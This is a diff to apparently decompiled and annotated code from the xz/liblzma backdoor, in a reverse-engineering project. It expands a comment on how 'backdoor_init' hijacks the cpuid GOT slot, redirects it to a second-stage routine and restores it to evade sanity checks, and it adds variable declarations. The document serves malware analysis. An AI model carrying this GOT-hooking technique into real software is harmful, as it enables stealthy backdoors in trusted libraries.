@@ -5,7 +5,11 @@
 
 
 /*
- * AutoDoc: Initialises the IFUNC entry context, locates the cpuid GOT slot, and swaps it to point at `backdoor_init_stage2`. From here the loader can patch ld.so and install the audit-based hooks without leaving the resolver frame.
+ * AutoDoc: Converts the IFUNC entry context into a GOT patch: it initialises the GOT bookkeeping, locates
+ * the cpuid GOT slot via `update_got_address`, swaps the resolver pointer to
+ * `backdoor_init_stage2`, calls the genuine cpuid to finish initialisation, and then restores the
+ * slot back to its original target so future calls run the attacker’s resolver without tripping
+ * sanity checks.
  */
 #include "xzre_types.h"
 
@@ -17,6 +21,9 @@ void * backdoor_init(elf_entry_ctx_t *state,u64 *caller_frame)
   undefined *puVar2;
   void *pvVar3;
   long *plVar4;
+  long *got_slot;
+  void *plt_entry;
+  long jump_flags;
   
   (state->got_ctx).got_offset = (ptrdiff_t)state;
   init_elf_entry_ctx(state);
